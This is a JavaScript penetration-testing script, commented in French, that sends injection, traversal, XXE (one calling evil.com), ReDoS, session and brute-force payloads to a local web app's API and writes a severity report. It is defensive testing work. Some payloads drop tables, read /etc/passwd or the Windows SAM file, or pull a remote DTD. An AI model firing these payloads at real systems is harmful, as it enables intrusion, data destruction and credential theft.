/**
 * Tests de pénétration avancés
 * Tests de sécurité offensive et simulation d'attaques
 */

const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class PenetrationTester {
  constructor(baseURL = 'http://localhost:3000') {
    this.baseURL = baseURL;
    this.vulnerabilities = [];
    this.attackVectors = [];
    this.sessionTokens = [];
  }

  /**
   * Simulation d'attaque par injection SQL avancée
   */
  async advancedSQLInjection() {
    console.log('💉 Test injection SQL avancée...');

    const sqlVectors = [
      // Union-based injection
      "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
      "' UNION SELECT * FROM information_schema.tables--",
      "' UNION SELECT * FROM information_schema.columns WHERE table_name='users'--",

      // Blind injection
      "' AND (SELECT COUNT(*) FROM users) > 0--",
      "' AND (SELECT SUBSTRING((SELECT password FROM users LIMIT 1),1,1))='a'--",
      "' AND IF(1=1, SLEEP(5), 0)--",

      // Time-based injection
      "'; IF(1=1, WAITFOR DELAY '0:0:5', 0)--",
      "'; BENCHMARK(5000000, MD5('test'))--",

      // Error-based injection
      "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--",
      "' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users))--",

      // Stacked queries
      "'; DROP TABLE users; SELECT * FROM applications WHERE '1'='1",
      "'; INSERT INTO users (email, password) VALUES ('redacted@example.invalid', 'password');--"
    ];

    const endpoints = [
      '/api/v1/applications/search',
      '/api/v1/companies/search',
      '/api/v1/contacts/search',
      '/api/v1/users/profile'
    ];

    const results = [];

    for (const endpoint of endpoints) {
      for (const vector of sqlVectors) {
        try {
          const response = await axios.post(`${this.baseURL}${endpoint}`, {
            search: vector,
            query: vector,
            filter: vector
          }, {
            timeout: 15000,
            headers: {
              'Authorization': 'Bearer mock-jwt-token-for-testing'
            }
          });

          // Détecter les signes d'injection SQL
          const isVulnerable =
            response.data.error?.includes('SQL') ||
            response.data.error?.includes('syntax') ||
            response.data.error?.includes('mysql') ||
            response.data.error?.includes('postgresql') ||
            response.status === 500 ||
            (response.data && typeof response.data === 'string' && response.data.includes('SQL'));

          if (isVulnerable) {
            results.push({
              endpoint,
              vector,
              vulnerability: 'SQL Injection',
              severity: 'CRITICAL',
              description: 'Injection SQL détectée',
              evidence: response.data.error || response.status
            });
            console.log(`❌ SQL Injection CRITIQUE: ${endpoint}`);
          } else {
            results.push({
              endpoint,
              vector,
              vulnerability: 'SQL Injection',
              severity: 'NONE',
              protected: true
            });
          }

        } catch (error) {
          // Erreur attendue pour les injections
          results.push({
            endpoint,
            vector,
            vulnerability: 'SQL Injection',
            severity: 'NONE',
            protected: true,
            error: error.message
          });
        }
      }
    }

    return results;
  }

  /**
   * Test d'injection NoSQL
   */
  async noSQLInjection() {
    console.log('🍃 Test injection NoSQL...');

    const noSQLVectors = [
      // MongoDB injection
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$regex": ".*"}',
      '{"$where": "this.password.length > 0"}',

      // Injection JavaScript
      '{"$where": "function() { return this.password; }"}',
      '{"$where": "sleep(5000)"}',

      // Operator injection
      '$ne',
      '$gt',
      '$regex',
      '$where',

      // Array injection
      '["$ne"]',
      '["$gt"]',
      '["$regex"]'
    ];

    const results = [];

    try {
      for (const vector of noSQLVectors) {
        const response = await axios.post(`${this.baseURL}/api/v1/search`, {
          query: vector,
          filter: vector,
          criteria: vector
        });

        // Détecter les réponses inattendues
        const isVulnerable =
          response.data.length > 100 ||
          response.data.includes('function') ||
          response.data.includes('sleep') ||
          response.data.includes('$where');

        if (isVulnerable) {
          results.push({
            vector,
            vulnerability: 'NoSQL Injection',
            severity: 'HIGH',
            description: 'Injection NoSQL détectée'
          });
        }
      }
    } catch (error) {
      // Erreurs attendues
    }

    return results;
  }

  /**
   * Test d'injection de commandes (Command Injection)
   */
  async commandInjection() {
    console.log('⚡ Test injection de commandes...');

    const commandVectors = [
      // Basic command injection
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '&& cat /etc/passwd',
      '|| cat /etc/passwd',

      // Windows commands
      '; dir C:\\',
      '| dir C:\\',
      '&& dir C:\\',

      // Linux commands
      '; ls -la /',
      '| ls -la /',
      '&& ls -la /',

      // Encoded payloads
      '%3B%20cat%20%2Fetc%2Fpasswd',
      '`; cat /etc/passwd; echo `',

      // URL encoded
      '%3B%20ls%20%2F',
      '%7C%20cat%20%2Fetc%2Fpasswd'
    ];

    const endpoints = [
      '/api/v1/search',
      '/api/v1/export',
      '/api/v1/import'
    ];

    const results = [];

    for (const endpoint of endpoints) {
      for (const vector of commandVectors) {
        try {
          const response = await axios.post(`${this.baseURL}${endpoint}`, {
            filename: vector,
            path: vector,
            command: vector
          });

          // Détecter l'exécution de commandes
          const isVulnerable =
            response.data.includes('root:') ||
            response.data.includes('bin/bash') ||
            response.data.includes('Directory of') ||
            response.data.includes('/etc/passwd') ||
            response.status === 500;

          if (isVulnerable) {
            results.push({
              endpoint,
              vector,
              vulnerability: 'Command Injection',
              severity: 'CRITICAL',
              description: 'Injection de commandes détectée'
            });
          }
        } catch (error) {
          // Erreurs attendues
        }
      }
    }

    return results;
  }

  /**
   * Test d'injection LDAP
   */
  async ldapInjection() {
    console.log('📋 Test injection LDAP...');

    const ldapVectors = [
      // LDAP injection patterns
      '*)(uid=*',
      '*)(|(objectClass=*))',
      '*)(&(objectClass=user)(cn=*))',
      '*))(|(cn=*))',

      // Filter bypass
      '*)(|(cn=*))',
      '*))%26',
      '*))%7C',

      // Wildcard abuse
      '*)%7C%28uid%3D%2A%29',
      '*)%26%28uid%3D%2A%29',

      // Null byte injection
      'admin%00',
      '*)%00(|(cn=*))'
    ];

    const results = [];

    try {
      for (const vector of ldapVectors) {
        const response = await axios.post(`${this.baseURL}/api/v1/auth/ldap`, {
          username: vector,
          filter: vector,
          search: vector
        });

        // Détecter les réponses LDAP inattendues
        const isVulnerable =
          response.data.users?.length > 1 ||
          response.data.includes('objectClass') ||
          response.data.includes('distinguishedName');

        if (isVulnerable) {
          results.push({
            vector,
            vulnerability: 'LDAP Injection',
            severity: 'HIGH',
            description: 'Injection LDAP détectée'
          });
        }
      }
    } catch (error) {
      // Erreurs attendues
    }

    return results;
  }

  /**
   * Test de traversée de répertoire (Path Traversal)
   */
  async pathTraversal() {
    console.log('📁 Test traversée de répertoire...');

    const traversalVectors = [
      // Basic traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc//passwd',
      '..%252f..%252f..%252fetc%252fpasswd',

      // URL encoded
      '..%2f..%2f..%2fetc%2fpasswd',
      '..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam',

      // Double encoding
      '..%252f..%252f..%252fetc%252fpasswd',
      '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',

      // Null byte
      '../../../etc/passwd%00.jpg',
      '..\\..\\..\\windows\\system32\\config\\sam%00.txt'
    ];

    const results = [];

    for (const vector of traversalVectors) {
      try {
        const response = await axios.get(`${this.baseURL}/api/v1/files/${vector}`);

        // Détecter l'accès à des fichiers système
        const isVulnerable =
          response.data.includes('root:') ||
          response.data.includes('bin/bash') ||
          response.data.includes('NT AUTHORITY') ||
          response.data.includes('/etc/passwd') ||
          response.data.includes('system32');

        if (isVulnerable) {
          results.push({
            vector,
            vulnerability: 'Path Traversal',
            severity: 'CRITICAL',
            description: 'Traversée de répertoire détectée',
            evidence: response.data.substring(0, 100)
          });
          console.log(`❌ Path Traversal CRITIQUE: ${vector}`);
        }
      } catch (error) {
        // Erreurs attendues pour les chemins invalides
      }
    }

    return results;
  }

  /**
   * Test d'injection XML (XXE)
   */
  async xxeInjection() {
    console.log('📄 Test injection XML (XXE)...');

    const xxePayloads = [
      // External entity
      `<?xml version="1.0"?>
      <!DOCTYPE root [
        <!ENTITY test SYSTEM "file:///etc/passwd">
      ]>
      <root>&test;</root>`,

      // Parameter entity
      `<?xml version="1.0"?>
      <!DOCTYPE root [
        <!ENTITY % test SYSTEM "file:///etc/passwd">
        %test;
      ]>
      <root></root>`,

      // Remote DTD
      `<?xml version="1.0"?>
      <!DOCTYPE root [
        <!ENTITY test SYSTEM "http://evil.com/malicious.dtd">
      ]>
      <root>&test;</root>`
    ];

    const results = [];

    for (const payload of xxePayloads) {
      try {
        const response = await axios.post(`${this.baseURL}/api/v1/import/xml`, {
          xml: payload,
          data: payload
        }, {
          headers: {
            'Content-Type': 'application/xml'
          }
        });

        // Détecter l'inclusion de fichiers externes
        const isVulnerable =
          response.data.includes('root:') ||
          response.data.includes('bin/bash') ||
          response.data.includes('malicious') ||
          response.data.includes('/etc/passwd');

        if (isVulnerable) {
          results.push({
            payload: payload.substring(0, 50) + '...',
            vulnerability: 'XXE Injection',
            severity: 'HIGH',
            description: 'Injection XML externe détectée'
          });
        }
      } catch (error) {
        // Erreurs attendues
      }
    }

    return results;
  }

  /**
   * Test de déni de service (DoS)
   */
  async dosAttack() {
    console.log('💀 Test déni de service...');

    const results = [];

    // Test ReDoS (Regular Expression DoS)
    const redosPayloads = [
      'a'.repeat(10000) + '!',
      '(a+)+'.repeat(1000),
      '(a|a)*'.repeat(1000),
      '([a-zA-Z]+)*'.repeat(1000)
    ];

    for (const payload of redosPayloads) {
      const startTime = Date.now();

      try {
        await axios.post(`${this.baseURL}/api/v1/validate`, {
          input: payload,
          regex: payload
        }, { timeout: 5000 });

        const duration = Date.now() - startTime;

        if (duration > 3000) { // Plus de 3 secondes
          results.push({
            payload: `ReDoS (${payload.length} chars)`,
            vulnerability: 'ReDoS',
            severity: 'HIGH',
            description: `Traitement lent: ${duration}ms`,
            duration
          });
          console.log(`⚠️ ReDoS détecté: ${duration}ms pour ${payload.length} caractères`);
        }
      } catch (error) {
        const duration = Date.now() - startTime;

        if (duration > 5000) { // Timeout
          results.push({
            payload: `ReDoS (${payload.length} chars)`,
            vulnerability: 'ReDoS',
            severity: 'CRITICAL',
            description: `Timeout après ${duration}ms`,
            duration
          });
          console.log(`❌ ReDoS CRITIQUE: timeout après ${duration}ms`);
        }
      }
    }

    return results;
  }

  /**
   * Test de fuite d'informations
   */
  async informationDisclosure() {
    console.log('🔍 Test fuite d\'informations...');

    const disclosureEndpoints = [
      '/api/debug',
      '/api/status',
      '/api/info',
      '/api/config',
      '/api/env',
      '/api/version',
      '/.git/HEAD',
      '/.env',
      '/config.json',
      '/package.json',
      '/composer.json'
    ];

    const results = [];

    for (const endpoint of disclosureEndpoints) {
      try {
        const response = await axios.get(`${this.baseURL}${endpoint}`);

        // Détecter les fuites d'informations sensibles
        const data = JSON.stringify(response.data).toLowerCase();
        const isVulnerable =
          data.includes('password') ||
          data.includes('secret') ||
          data.includes('token') ||
          data.includes('key') ||
          data.includes('database') ||
          data.includes('connection') ||
          data.includes('env') ||
          data.includes('config') ||
          response.data.database ||
          response.data.secrets ||
          response.data.environment;

        if (isVulnerable) {
          results.push({
            endpoint,
            vulnerability: 'Information Disclosure',
            severity: 'MEDIUM',
            description: 'Fuite d\'informations sensibles',
            evidence: response.data
          });
          console.log(`⚠️ Fuite d'info: ${endpoint}`);
        }
      } catch (error) {
        // Endpoints non existants (normal)
      }
    }

    return results;
  }

  /**
   * Test de sécurité des sessions
   */
  async sessionSecurity() {
    console.log('🍪 Test sécurité des sessions...');

    const results = [];

    try {
      // Test de fixation de session
      const response1 = await axios.get(`${this.baseURL}/api/v1/auth/login`);

      // Test avec session fixe
      const response2 = await axios.get(`${this.baseURL}/api/v1/applications`, {
        headers: {
          'Cookie': 'session=fixed_session_id_12345',
          'Authorization': 'Bearer fixed_jwt_token'
        }
      });

      if (response2.status === 200) {
        results.push({
          vulnerability: 'Session Fixation',
          severity: 'HIGH',
          description: 'Session fixation possible'
        });
      }

      // Test de vol de session
      const maliciousResponse = await axios.get(`${this.baseURL}/api/v1/users/profile`, {
        headers: {
          'Cookie': 'session=stolen_session_12345'
        }
      });

      if (maliciousResponse.status === 200) {
        results.push({
          vulnerability: 'Session Hijacking',
          severity: 'CRITICAL',
          description: 'Vol de session possible'
        });
      }

    } catch (error) {
      // Erreurs attendues pour les sessions invalides
      results.push({
        vulnerability: 'Session Security',
        severity: 'NONE',
        protected: true,
        description: 'Sessions sécurisées'
      });
    }

    return results;
  }

  /**
   * Test de sécurité des APIs
   */
  async apiSecurity() {
    console.log('🔌 Test sécurité des APIs...');

    const results = [];

    // Test d'énumération des utilisateurs
    try {
      for (let i = 1; i <= 10; i++) {
        const response = await axios.get(`${this.baseURL}/api/v1/users/${i}`);

        if (response.status === 200) {
          results.push({
            endpoint: `/api/v1/users/${i}`,
            vulnerability: 'User Enumeration',
            severity: 'LOW',
            description: 'Énumération des utilisateurs possible'
          });
        }
      }
    } catch (error) {
      // Erreurs attendues
    }

    // Test de force brute
    const commonPasswords = ['password', '123456', 'admin', 'root', 'user'];
    let bruteForceCount = 0;

    for (const password of commonPasswords) {
      try {
        await axios.post(`${this.baseURL}/api/v1/auth/login`, {
          email: 'redacted@example.invalid',
          password: password
        });

        bruteForceCount++;
      } catch (error) {
        // Erreurs attendues
      }
    }

    if (bruteForceCount > 3) {
      results.push({
        vulnerability: 'Brute Force',
        severity: 'MEDIUM',
        description: 'Protection anti-brute force insuffisante'
      });
    }

    return results;
  }

  /**
   * Génère un rapport de pénétration
   */
  generatePenetrationReport(vulnerabilities) {
    console.log('\n🛡️ RAPPORT DE PÉNÉTRATION:');
    console.log('============================');

    const critical = vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
    const high = vulnerabilities.filter(v => v.severity === 'HIGH').length;
    const medium = vulnerabilities.filter(v => v.severity === 'MEDIUM').length;
    const low = vulnerabilities.filter(v => v.severity === 'LOW').length;

    console.log(`🚨 CRITIQUES: ${critical}`);
    console.log(`🔴 HAUTES: ${high}`);
    console.log(`🟡 MOYENNES: ${medium}`);
    console.log(`🟢 BASSES: ${low}`);
    console.log(`✅ SÉCURISÉES: ${vulnerabilities.filter(v => v.protected).length}`);

    let riskLevel = 'LOW';
    if (critical > 0) riskLevel = 'CRITICAL';
    else if (high > 0) riskLevel = 'HIGH';
    else if (medium > 0) riskLevel = 'MEDIUM';

    console.log(`\n⚠️ NIVEAU DE RISQUE: ${riskLevel}`);

    if (critical > 0) {
      console.log('\n❌ VULNÉRABILITÉS CRITIQUES DÉTECTÉES!');
      console.log('Actions immédiates requises.');
    } else if (high > 0) {
      console.log('\n⚠️ Vulnérabilités importantes détectées.');
      console.log('Correction recommandée dans les plus brefs délais.');
    } else {
      console.log('\n✅ Sécurité acceptable détectée.');
      console.log('Surveillance continue recommandée.');
    }

    return {
      timestamp: new Date().toISOString(),
      riskLevel,
      totalVulnerabilities: vulnerabilities.length,
      critical,
      high,
      medium,
      low,
      secure: vulnerabilities.filter(v => v.protected).length,
      vulnerabilities: vulnerabilities.filter(v => !v.protected),
      recommendations: this.generateRecommendations(critical, high, medium, low)
    };
  }

  generateRecommendations(critical, high, medium, low) {
    const recommendations = [];

    if (critical > 0) {
      recommendations.push('URGENT: Corriger les vulnérabilités critiques');
      recommendations.push('Auditer le code pour d\'autres problèmes similaires');
      recommendations.push('Implémenter des tests de sécurité automatisés');
    }

    if (high > 0) {
      recommendations.push('Planifier la correction des vulnérabilités importantes');
      recommendations.push('Renforcer la validation des entrées');
      recommendations.push('Améliorer la gestion des erreurs');
    }

    if (medium > 0) {
      recommendations.push('Programmer la correction des vulnérabilités moyennes');
      recommendations.push('Améliorer la journalisation de sécurité');
    }

    if (critical === 0 && high === 0 && medium === 0) {
      recommendations.push('Maintenir la surveillance continue');
      recommendations.push('Effectuer des tests de pénétration réguliers');
      recommendations.push('Mettre à jour les dépendances de sécurité');
    }

    return recommendations;
  }

  async runAllTests() {
    console.log('🔓 Lancement des tests de pénétration...\n');

    try {
      const penetrationTests = await Promise.all([
        this.advancedSQLInjection(),
        this.noSQLInjection(),
        this.commandInjection(),
        this.ldapInjection(),
        this.pathTraversal(),
        this.xxeInjection(),
        this.dosAttack(),
        this.informationDisclosure(),
        this.sessionSecurity(),
        this.apiSecurity()
      ]);

      const allResults = penetrationTests.flat();
      const report = this.generatePenetrationReport(allResults);

      // Sauvegarder le rapport
      const reportPath = path.join('tests', 'reports', 'penetration-test.json');
      fs.mkdirSync(path.dirname(reportPath), { recursive: true });
      fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));

      console.log(`\n📋 Rapport de pénétration sauvegardé: ${reportPath}`);

      return report;

    } catch (error) {
      console.error('❌ Erreur lors des tests de pénétration:', error);
      return { error: error.message };
    }
  }
}

// Script principal
async function main() {
  const tester = new PenetrationTester();

  try {
    await tester.runAllTests();
    process.exit(0);
  } catch (error) {
    console.error('❌ Erreur fatale:', error.message);
    process.exit(1);
  }
}

if (require.main === module) {
  main();
}

module.exports = PenetrationTester;
